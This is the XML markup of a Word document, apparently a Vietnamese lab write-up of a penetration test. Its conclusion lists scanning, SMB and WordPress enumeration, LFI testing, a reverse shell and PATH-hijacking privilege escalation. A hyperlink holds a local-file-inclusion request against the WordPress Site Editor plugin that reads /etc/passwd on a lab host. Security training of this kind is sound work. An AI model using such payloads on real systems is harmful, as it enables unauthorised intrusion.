                      <a:ext cx="6217920" cy="4001135"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="63518B92" w14:textId="77777777" w:rsidR="00FB1DF1" w:rsidRDefault="00FB1DF1">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="78461A1E" wp14:editId="75D8197D">
            <wp:extent cx="6217920" cy="1397000"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="889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80843" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId30"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="1397000"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="058E1610" w14:textId="7DDC1509" w:rsidR="00FB1DF1" w:rsidRPr="00FB1DF1" w:rsidRDefault="00FB1DF1" w:rsidP="00FB1DF1">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7F1FEEDB" wp14:editId="4A1DA9A9">
            <wp:extent cx="6217920" cy="3557270"/>
            <wp:effectExtent l="0" t="0" r="0" b="5080"/>
            <wp:docPr id="13947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7170" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId31"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="3557270"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="286E3B1D" w14:textId="7E56CF09" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Kết luận</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27DE886D" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Quá trình thực hiện gồm dò quét, thu thập thông tin SMB và WordPress, kiểm tra LFI, tạo reverse shell và khai thác PATH hijacking để leo quyền.</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="006803BF"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928920">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="1593080973">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="993994234">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="230192049">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1595473980">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="370765613">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1016079037">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="198593962">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="170741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E12"/>
    <w:rsid w:val="0015074B"/>
    <w:rsid w:val="00167BD2"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="003056E5"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="00390ABC"/>
    <w:rsid w:val="0054315D"/>
    <w:rsid w:val="006803BF"/>
    <w:rsid w:val="00881693"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00BF26EC"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00D27B88"/>
    <w:rsid w:val="00DA0779"/>
    <w:rsid w:val="00F72BB5"/>
    <w:rsid w:val="00FB1D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B8832"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{7645F166-D2DB-4634-A8BB-A63EAF5BA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7BD2"/>
    <w:rPr>
      <w:color w:val="0000FF" w:themeColor="hyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="UnresolvedMention">
    <w:name w:val="Unresolved Mention"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00167BD2"/>
    <w:rPr>
      <w:color w:val="605E5C"/>
      <w:shd w:val="clear" w:color="auto" w:fill="E1DFDD"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="HTMLPreformatted">
    <w:name w:val="HTML Preformatted"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HTMLPreformattedChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00167BD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7BD2"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consola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hyperlink" Target="http://192.168.56.118/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd"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seclists.org/fulldisclosure/2018/Mar/40" TargetMode="Externa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15</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2026-07-26T09:04:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>